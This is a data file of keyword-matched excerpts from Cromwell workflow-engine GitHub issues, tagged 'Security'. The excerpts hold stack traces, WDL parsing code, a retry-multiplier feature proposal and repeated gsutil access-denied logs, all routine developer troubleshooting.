The job was stopped before the command finished. PAPI error code 2. Execution failed: generic::unknown: installing drivers: container exited with unexpected exit code 1: + COS_DOWNLOAD_GCS=https://storage.googleapis.com/cos-tools; + COS_KERNEL_SRC_GIT=https://chromium.googlesource.com/chromiumos/third_party/kernel; + COS_KERNEL_SRC_ARCHIVE=kernel-src.tar.gz; + TOOLCHAIN_URL_FILENAME=toolchain_url; + TOOLCHAIN_ARCHIVE=toolchain.tar.xz; + TOOLCHAIN_ENV_FILENAME=toolchain_env; + CHROMIUMOS_SDK_GCS=https://storage.googleapis.com/chrom",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5714:1693,PASSWORD,PASSWORDS,1693,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5714,1,['PASSWORD'],['PASSWORDS']
Security," akka.actor.Actor.aroundReceive$(Actor.scala:512); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.aroundReceive(ConfigAsyncJobExecutionActor.scala:208); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); at akka.actor.ActorCell.invoke(ActorCell.scala:496); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Optional value was not set and no 'default' attribute was provided; Optional value was not set and no 'default' attribute was provided; at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:60); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:56); at cromwell.backend.standard.StandardAsyncExecutionActor.instantiatedCommand(StandardAsyncExecutionActor.scala:534); ... 39 common frames omitted. ```. <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your c",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3927:5345,Validat,Validation,5345,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3927,2,['Validat'],"['Validation', 'ValidationTry']"
Security," at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigA",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:1840,validat,validation,1840,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['validat'],['validation']
Security," backend configuration, since whether this is something you want to do or not will depend on the infrastucture your workflow is running on. One potential way to configure this, might be to add multipliers for certain runtime attributes in the backend configuration:; ```; [...]; config {; runtime-attributes = """"""; Int? cpu = 1; Int? memory = 4; """"""; runtime-attribute-retry-multipliers = {; memory: 1.5; }; [...]; }; [...]; ```. This would, for example, cause the memory attribute to be multiplied by `1.5` with each retry. For the first attempt it would be `4`, for the the second `6`, the third `9` etc. Another option might be that the values here indicate a fraction of the original attribute which it should be increased it by each retry, so in the above example it would be: `4` -> `10` -> `16` etc. You would probably want set a lower value in that case, though. Another option would be to supply a list of numbers with each indicating a multiplier for a certain attempt. A value of `[1.5, 2]` (or maybe `[1, 1.5, 2]`) would cause the value to be multiplied by `1.5` on the second attempt and `2` on the third, repeating the last multiplier if neccesary. (ie. `4` -> `6` -> `8` -> `8`). <!--; Hi! Thanks for taking the time to report feedback. Before posting an issue here, please check whether your question is already answered in our:; forum https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; documentation http://cromwell.readthedocs.io/en/develop/. Other forums:; FireCloud https://gatkforums.broadinstitute.org/firecloud/categories/ask-the-firecloud-team; WDL https://gatkforums.broadinstitute.org/wdl/categories/ask-the-wdl-team; CWL https://www.biostars.org/; -->. <!-- Are you seeing something that looks like a bug? Then great! You're in the right place. -->. <!-- Which backend are you running? -->. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4346:2280,PASSWORD,PASSWORDS,2280,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4346,1,['PASSWORD'],['PASSWORDS']
Security," but really having problems with the `sepFunctionEvaluator`, it's a two value function so I tried to use the `processTwoValidatedValues` from `wdl.transforms.base.linking.expression.values.EngineFunctionEvaluators`, but I'm getting errors on the evaluateValue:. ```scala; val value1 = expressionValueEvaluator.evaluateValue(a.arg1, inputs, ioFunctionSet, forCommandInstantiationOptions)(expressionValueEvaluator); val value2 = expressionValueEvaluator.evaluateValue(a.arg2, inputs, ioFunctionSet, forCommandInstantiationOptions)(expressionValueEvaluator); processTwoValidatedValues[WomArray, WomString, WomString](value1, value2) { (arr1, sepvalue) =>; EvaluatedValue(WomString(arr1.value.mkString(sepvalue.value)), Seq.empty).validNel; }; ```. But I get the following error:. ```; [error] /Users/franklinmichael/source/cromwell/wdl/transforms/biscayne/src/main/scala/wdl/transforms/biscayne/linking/expression/values/BiscayneValueEvaluators.scala:164:64: type mismatch;; [error] found : common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]]; [error] (which expands to) cats.data.Validated[cats.data.NonEmptyList[String],wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]]; [error] required: common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]; [error] (which expands to) cats.data.Validated[cats.data.NonEmptyList[String],wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]; [error] processTwoValidatedValues[WomArray, WomString, WomString](value1, value2) { (arr1, sepvalue) =>; [error] ^; [info] common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomString]] <: common.validation.ErrorOr.ErrorOr[wdl.model.draft3.graph.expression.EvaluatedValue[wom.values.WomArray]]?; ```. I also tried switching this to use:. ```scala; processTwoValidatedValues[WomArray, WomString, WomString](a.arg1.evaluateValue(inputs, ioF",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5494:1370,validat,validation,1370,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5494,1,['validat'],['validation']
Security," causedBy: [ ],; message: ""wdl.WdlGraphNode$.buildWomGraph(WdlGraphNode.scala:140)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow$.womWorkflowDefinition(WdlWorkflow.scala:52)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow.womDefinition$lzycompute(WdlWorkflow.scala:73)""; },; {; causedBy: [ ],; message: ""wdl.WdlWorkflow.womDefinition(WdlWorkflow.scala:73)""; },; {; causedBy: [ ],; message: ""wdl.WdlInputParsing$.buildWomExecutable(WdlInputParsing.scala:27)""; },; {; causedBy: [ ],; message: ""wdl.WdlNamespaceWithWorkflow.womExecutable(WdlNamespace.scala:98)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$15(MaterializeWorkflowDescriptorActor.scala:493)""; },; {; causedBy: [ ],; message: ""scala.util.Either.flatMap(Either.scala:338)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.$anonfun$validateWdlNamespace$13(MaterializeWorkflowDescriptorActor.scala:491)""; },; {; causedBy: [ ],; message: ""scala.util.Either.flatMap(Either.scala:338)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.validateWdlNamespace(MaterializeWorkflowDescriptorActor.scala:490)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor.cromwell$engine$workflow$lifecycle$materialization$MaterializeWorkflowDescriptorActor$$buildWorkflowDescriptor(MaterializeWorkflowDescriptorActor.scala:231)""; },; {; causedBy: [ ],; message: ""cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:157)""; },; {; causedBy: [ ],; message: ""scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:304)""; },; {; causedBy: [ ],; message: ""scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37)""; },;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3143:1634,validat,validateWdlNamespace,1634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3143,1,['validat'],['validateWdlNamespace']
Security," creating a `CallableTaskDefinition` structure. This structure has an empty meta section. When rewriting `foo` in draft-2, this works as expected. . ```wdl; version 1.0. task foo {; input {; String buf ; }; command {}; output {; String s = buf; } ; meta {; type : ""native"",; id: ""applet-xxxx""; }; }; ```. This is the code used to parse the task: ; ```scala; // Extract the only task from a namespace ; def getMainTask(bundle: WomBundle) : CallableTaskDefinition = {; // check if the primary is nonempty ; val task: Option[CallableTaskDefinition] = bundle.primaryCallable match {; case Some(task : CallableTaskDefinition) => Some(task); case Some(exec : ExecutableTaskDefinition) => Some(exec.callableTaskDefinition); case _ => None; }; task match {; case Some(x) => x; case None =>; // primary is empty, check the allCallables map ; if (bundle.allCallables.size != 1); throw new Exception(""WDL file must contains exactly one task""); val (_, task) = bundle.allCallables.head; task match {; case task : CallableTaskDefinition => task; case exec : ExecutableTaskDefinition => exec.callableTaskDefinition; case _ => throw new Exception(""Cannot find task inside WDL file""); 		}; }; }. def parseWdlTask(wfSource: String) : CallableTaskDefinition = {; val languageFactory =; if (wfSource.startsWith(""version 1.0"") ||; wfSource.startsWith(""version draft-3"")) {; new WdlDraft3LanguageFactory(ConfigFactory.empty()); } else {; new WdlDraft2LanguageFactory(ConfigFactory.empty()); }. val bundleChk: Checked[WomBundle] =; languageFactory.getWomBundle(wfSource, ""{}"", List.empty, List(languageFactory)); val womBundle = bundleChk match {; case Left(errors) => throw new Exception(s""""""|WOM validation errors: ; | ${errors} ; |"""""".stripMargin); case Right(bundle) => bundle; }; val task: Option[CallableTaskDefinition] = bundle.primaryCallable match {; case Some(task : CallableTaskDefinition) => Some(task); case Some(exec : ExecutableTaskDefinition) => Some(exec.callableTaskDefinition); case _ => None; }. }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4709:1758,validat,validation,1758,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4709,1,['validat'],['validation']
Security," failed. The job was stopped before the command finished. PAPI error code 10. 15: Gsutil failed: failed to upload logs for ""gs://xxx/cromwell-execution/wf_hello/28f84555-6e06-41be-891b-84de0f35ee74/call-hello/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://xxx/cromwell-execution/wf_hello/28f84555-6e06-41be-891b-84de0f35ee74/call-hello/, command failed: BadRequestException: 400 Bucket is requester pays bucket but no user project provided.; ```; Is this because Pipelines API version 1 does not support buckets with requester pays? If so, why cannot Cromwell just say so? Notice that the [tutorial](https://cromwell.readthedocs.io/en/stable/tutorials/PipelinesApi101/) does not say that requester pays does not work with Pipelines API version 1, it says instead `more information for Requester Pays can be found at: [Requester Pays](https://cloud.google.com/storage/docs/requester-pays)`. In any case, I have removed the Requester Pays option from the bucket, as I pretty much given up on that. I was then able to run the `hello.wdl` workflow fine using the configuration file above. I tried to run the `mutect2.wdl` workflow and then I have encountered a new issue when trying to localize a file in a bucket for which I have permissions to read without problems using my Google account. The error contained the following:; ```; command failed: AccessDeniedException: 403 xxx@xxx.gserviceaccount.com does not have storage.objects.list access to the Google Cloud Storage bucket.; ```; I have tried to fix that as follows:; ```; $ gcloud projects add-iam-policy-binding xxx --member serviceAccount:xxx@xxx.gserviceaccount.com --role roles/storage.objects.list; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/storage.objects.list is not supported for this resource.; ```; No luck.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:4851,Access,AccessDeniedException,4851,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,3,"['Access', 'access']","['AccessDeniedException', 'access']"
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:41:59 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:00 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:00 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:4154,access,access,4154,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:16 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:17 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:17 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:5408,access,access,5408,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:42:40 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:42:41 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:42:41 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:6662,access,access,6662,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:11 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:12 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:12 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:7916,access,access,7916,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:43:42 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:43:43 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:43:43 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:9170,access,access,9170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:13 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:14 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:14 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/0",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974:10424,access,access,10424,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1961#issuecomment-278115974,1,['access'],['access']
Security," firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:44:44 I: Running command: sudo gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; 2017/02/07 15:44:46 E: command failed: AccessDeniedException: 403; Caller does not have storage.objects.list access to bucket; firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred.; (exit status 1); 2017/02/07 15:44:46 W: cp failed: gsutil -q -m cp; gs://firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list; /mnt/local-disk/firecloud-tcga-open-access/tutorial/reference/whole_exome_agilent_1.1_refseq_plus_3_boosters_plus_10bp_padding_minus_mito.Homo_sapiens_assembly19.targets.interval_list,; command failed: AccessDeniedException: 403 Caller does not have; storage.objects.list access to bucket firecloud-tcga-open-access.; CommandException: 1 file/object could not be transferred. 2017/02/07 15:45:16 I: Running command: sudo gsutil -q -m cp; 